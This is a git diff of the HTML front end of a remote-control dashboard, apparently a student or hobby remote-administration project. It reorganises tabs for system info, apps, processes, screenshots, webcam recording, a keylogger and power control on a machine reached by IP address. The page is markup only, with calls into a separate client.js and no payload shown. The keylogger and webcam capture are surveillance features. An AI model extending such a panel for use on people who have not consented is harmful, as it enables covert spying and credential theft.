@@ -9,66 +9,53 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
     <aside class="sidebar">
         <div class="sidebar-header">
-            <div class="logo-box">
-                <i data-lucide="link" class="logo-icon"></i>
-            </div>
+            <div class="logo-box"><i data-lucide="link" class="logo-icon"></i></div>
         </div>
-
         <nav class="nav-menu">
-            <button class="nav-item active" onclick="switchTab('home', this)">
-                <i data-lucide="home"></i>
-            </button>
-            <button class="nav-item" onclick="switchTab('apps', this)">
-                <i data-lucide="app-window"></i>
-            </button>
-            <button class="nav-item" onclick="switchTab('processes', this)">
-                <i data-lucide="activity"></i>
-            </button>
-            <button class="nav-item" onclick="switchTab('media', this)">
-                <i data-lucide="camera"></i>
-            </button>
-            <button class="nav-item" onclick="switchTab('webcam', this)">
-                <i data-lucide="video"></i>
-            </button>
-            <button class="nav-item" onclick="switchTab('keylogger', this)">
-                <i data-lucide="keyboard"></i>
-            </button>
-
+            <button class="nav-item active" onclick="switchTab('home', this)"><i data-lucide="home"></i></button>
+            <button class="nav-item" onclick="switchTab('apps', this)"><i data-lucide="app-window"></i></button>
+            <button class="nav-item" onclick="switchTab('processes', this)"><i data-lucide="activity"></i></button>
+            <button class="nav-item" onclick="switchTab('media', this)"><i data-lucide="camera"></i></button>
+            <button class="nav-item" onclick="switchTab('webcam', this)"><i data-lucide="video"></i></button>
+            <button class="nav-item" onclick="switchTab('keylogger', this)"><i data-lucide="keyboard"></i></button>
             <div class="spacer"></div>
-            <button class="nav-item power-nav" onclick="switchTab('power', this)">
-                <i data-lucide="power"></i>
-            </button>
+            <button class="nav-item power-nav" onclick="switchTab('power', this)"><i data-lucide="power"></i></button>
         </nav>
     </aside>
 
     <main class="main-content">
-
         <header class="top-bar">
             <h2 id="page-title">Home</h2>
-            <div class="connection-area">
-                <div class="input-pill">
-                    <i data-lucide="network"></i>
-                    <input type="text" id="ipInput" placeholder="192.168.1.X" value="127.0.0.1">
+            <div class="right-header-group">
+                <div class="status-bar-pill">
+                    <div class="status-item" id="top-status-keylog">
+                        <span class="indicator"></span> Keylogger
+                    </div>
+                    <div class="divider-vertical"></div>
+                    <div class="status-item" id="top-status-webcam">
+                        <span class="indicator"></span> Webcam
+                    </div>
                 </div>
-                <button class="btn-gradient-blue" id="btnConnect">
-                    <span id="btn-text">Connect</span>
-                </button>
-                <div class="status-dot disconnected" id="connection-dot"></div>
+                <div class="connection-area">
+                    <div class="input-pill">
+                        <i data-lucide="network"></i>
+                        <input type="text" id="ipInput" placeholder="192.168.1.X" value="127.0.0.1">
+                    </div>
+                    <button class="btn-gradient-blue" id="btnConnect">
+                        <span id="btn-text">Connect</span>
+                    </button>
+                    <div class="status-dot disconnected" id="connection-dot"></div>
+                </div>
             </div>
         </header>
 
         <div class="content-wrapper">
-
             <section id="tab-home" class="tab-content active">
                 <div class="dashboard-grid">
                     <div class="card sys-info-card">
-                        <div class="card-header-home">
-                            <i data-lucide="monitor" class="icon-header"></i>
-                            <h3>System Info</h3>
-                        </div>
+                        <div class="card-header-home"><i data-lucide="monitor" class="icon-header"></i><h3>System Info</h3></div>
                         <div class="info-content">
                             <div class="info-row"><span>Hostname</span> <strong id="sys-hostname">---</strong></div>
                             <div class="info-row"><span>OS</span> <strong id="sys-os">---</strong></div>
@@ -76,46 +63,30 @@
                             <div class="info-row"><span>Network</span> <strong id="sys-network" class="text-red">Disconnected</strong></div>
                         </div>
                     </div>
-
                     <div class="card resources-card">
-                        <div class="card-header-home">
-                            <i data-lucide="cpu" class="icon-header"></i>
-                            <h3>Resources</h3>
-                        </div>
+                        <div class="card-header-home"><i data-lucide="cpu" class="icon-header"></i><h3>Resources</h3></div>
                         <div class="charts-container">
                             <div class="chart-box">
-                                <div class="circular-chart" id="chart-cpu" style="--p:0; --c:#60a5fa;"><span>0%</span></div>
-                                <p>CPU Usage</p>
+                                <div class="circular-chart" id="chart-cpu" style="--p:0; --c:#60a5fa;"><span>0%</span></div><p>CPU Usage</p>
                             </div>
                             <div class="chart-box">
-                                <div class="circular-chart" id="chart-ram" style="--p:0; --c:#f472b6;"><span>0%</span></div>
-                                <p>RAM Usage</p>
+                                <div class="circular-chart" id="chart-ram" style="--p:0; --c:#f472b6;"><span>0%</span></div><p>RAM Usage</p>
                             </div>
                         </div>
                     </div>
-
                     <div class="card sensors-card">
-                        <div class="card-header-home">
-                            <i data-lucide="thermometer" class="icon-header"></i>
-                            <h3>Status</h3>
-                        </div>
+                        <div class="card-header-home"><i data-lucide="thermometer" class="icon-header"></i><h3>Live Status</h3></div>
                         <div class="sensor-grid">
-                            <div class="sensor-item"><span>CPU Temp</span> <strong id="sensor-temp">--°C</strong></div>
-                            <div class="sensor-item"><span>Keylogger</span> <strong id="status-keylog" class="text-muted">Idle</strong></div>
-                            <div class="sensor-item"><span>Webcam</span> <strong id="status-webcam" class="text-muted">Idle</strong></div>
-                            <div class="sensor-item"><span>Ping</span> <strong id="sensor-ping">-- ms</strong></div>
+                            <div class="sensor-item"><span>CPU Temp</span> <strong id="sensor-temp" style="color:#f472b6">--°C</strong></div>
+                            <div class="sensor-item"><span>Ping</span> <strong id="sensor-ping" style="color:#60a5fa">-- ms</strong></div>
+                            <div class="sensor-item"><span>Resolution</span> <strong id="status-res" style="color:#60a5fa">---</strong></div>
+                            <div class="sensor-item"><span>Battery</span> <strong id="status-batt" style="color:#f472b6">---</strong></div>
                         </div>
                     </div>
-
                     <div class="card logs-card">
-                        <div class="card-header-home">
-                            <i data-lucide="history" class="icon-header"></i>
-                            <h3>Recent Activity</h3>
-                        </div>
+                        <div class="card-header-home"><i data-lucide="history" class="icon-header"></i><h3>Recent Activity</h3></div>
                         <div class="activity-scroll">
-                            <ul class="activity-list" id="activity-list">
-                                <li><span class="dot-log blue"></span> Waiting for connection...</li>
-                            </ul>
+                            <ul class="activity-list" id="activity-list"><li><span class="dot-log blue"></span> Waiting for connection...</li></ul>
                         </div>
                     </div>
                 </div>
@@ -127,15 +98,15 @@
                     <div class="control-bar">
                         <input type="text" id="appInput" placeholder="App Name (e.g. notepad)..." class="glass-input grow">
                         <button class="btn-gradient-blue" onclick="handleAppAction('start')"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
-                        <button class="btn-danger-red" onclick="handleAppAction('kill')"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
+                        <button class="btn-danger-red" onclick="handleAppAction('stop')"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
                         <div class="divider"></div>
-                        <button class="btn-secondary" onclick="sendCmd('list-apps')">List</button>
-                        <button class="btn-icon-only" onclick="sendCmd('list-apps')"><i data-lucide="refresh-cw"></i></button>
+                        <button class="btn-secondary" onclick="sendCmd('list-app')">List</button>
+                        <button class="btn-icon-only" onclick="sendCmd('list-app')"><i data-lucide="refresh-cw"></i></button>
                     </div>
                     <div class="table-wrapper">
                         <table class="glass-table">
-                            <thead><tr><th>PID</th><th>Name</th><th>Threads</th><th>RAM (MB)</th></tr></thead>
-                            <tbody id="app-list-body"><tr><td colspan="4" class="text-center">Press List to view running apps</td></tr></tbody>
+                            <thead><tr><th style="width:50px">Icon</th><th>App Name</th><th>Path</th><th>Status</th></tr></thead>
+                            <tbody id="app-list-body"><tr><td colspan="4" class="text-center">Press List to view installed apps</td></tr></tbody>
                         </table>
                     </div>
                 </div>
@@ -162,39 +133,96 @@
             </section>
 
             <section id="tab-media" class="tab-content">
-                <div class="card center-content">
-                    <div class="preview-box" id="screenshot-preview">
-                        <div class="placeholder-content"><i data-lucide="image"></i><p>No screenshot</p></div>
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header"><h3>Screenshot Viewer</h3></div>
+                        <div class="preview-box" id="screenshot-preview">
+                            <div class="placeholder-content">
+                                <i data-lucide="image"></i>
+                                <p>No screenshot captured</p>
+                            </div>
+                        </div>
+                        <div class="controls-area">
+                            <button class="btn-gradient-hybrid large" onclick="requestScreenshot()">
+                                <i data-lucide="aperture" class="btn-icon-inside"></i> Capture Screen
+                            </button>
+                            <div id="screenshot-download-area">
+                                <div class="download-bar">
+                                    <select id="img-format" class="glass-input compact">
+                                        <option value="png">PNG (High Quality)</option>
+                                        <option value="jpeg">JPG (Small Size)</option>
+                                    </select>
+                                    <button onclick="downloadScreenshot()" class="btn-download-pill" id="btn-save-screen" disabled style="opacity: 0.5; cursor: not-allowed;">
+                                        <i data-lucide="download"></i> Save
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
                     </div>
-                    <div class="controls-row">
-                        <button class="btn-gradient-hybrid large" onclick="alert('Tính năng đang cập nhật')"><i data-lucide="aperture" class="btn-icon-inside"></i> Take Screenshot</button>
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('screenshot')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="screenshot-history-list">
+                            <p class="text-center-small">Empty</p>
+                        </div>
                     </div>
                 </div>
             </section>
 
             <section id="tab-webcam" class="tab-content">
-                <div class="card center-content">
-                    <div class="preview-box video-mode" id="webcam-preview">
-                        <div class="placeholder-content"><i data-lucide="video-off"></i><p>Webcam Idle</p></div>
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header"><h3>Webcam Stream</h3></div>
+                        <div class="preview-box video-mode" id="webcam-preview">
+                            <div class="placeholder-content">
+                                <i data-lucide="video-off"></i>
+                                <p>Webcam Idle</p>
+                            </div>
+                        </div>
+                        <div class="controls-area">
+                            <button class="btn-gradient-hybrid large" id="btn-record" onclick="toggleWebcam()">
+                                <i data-lucide="radio" class="btn-icon-inside"></i> Record (10s)
+                            </button>
+                            <div id="webcam-download-area" style="min-height: 46px;"></div>
+                        </div>
                     </div>
-                    <div class="controls-row">
-                        <button class="btn-gradient-hybrid large" id="btn-record" onclick="requestWebcam()"><i data-lucide="radio" class="btn-icon-inside"></i> Record 10s</button>
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('webcam')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="webcam-history-list">
+                            <p class="text-center-small">Empty</p>
+                        </div>
                     </div>
-                    <div id="webcam-download-area" class="mt-20"></div>
                 </div>
             </section>
 
             <section id="tab-keylogger" class="tab-content">
-                <div class="card full-height">
-                    <div class="card-header">
-                        <h3>Keylogger Records</h3>
-                        <div class="actions">
-                            <button class="btn-gradient-blue" onclick="sendCmd('start-keylog')"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
-                            <button class="btn-danger-red" onclick="sendCmd('stop-keylog')"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
-                            <button class="btn-secondary" onclick="sendCmd('get-keylog')"><i data-lucide="download-cloud" class="btn-icon-inside"></i> Fetch</button>
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header">
+                            <h3>Keylogger Records</h3>
+                            <div class="actions">
+                                <button class="btn-gradient-blue" onclick="startKeylog()"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                                <button class="btn-danger-red" onclick="stopKeylog()"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
+                                <button class="btn-gradient-hybrid" onclick="fetchKeylog()"><i data-lucide="download-cloud" class="btn-icon-inside"></i> Fetch</button>
+                                <button class="btn-secondary" onclick="clearKeylogDisplay()"><i data-lucide="eraser" class="btn-icon-inside"></i> Clear</button>
+                            </div>
+                        </div>
+                        <div class="log-container" id="keylog-output"><span class="text-muted">Waiting for data...</span></div>
+                    </div>
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('keylog')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="keylog-history-list">
+                            <p class="text-center-small">Empty</p>
                         </div>
                     </div>
-                    <div class="log-container" id="keylog-output"><span class="text-muted">Waiting for data...</span></div>
                 </div>
             </section>
 
@@ -210,9 +238,10 @@
                     </div>
                 </div>
             </section>
-
         </div>
     </main>
+
+    <div id="toast-container"></div>
 
     <script src="client.js"></script>
     <script>if(typeof lucide !== 'undefined') lucide.createIcons();</script>
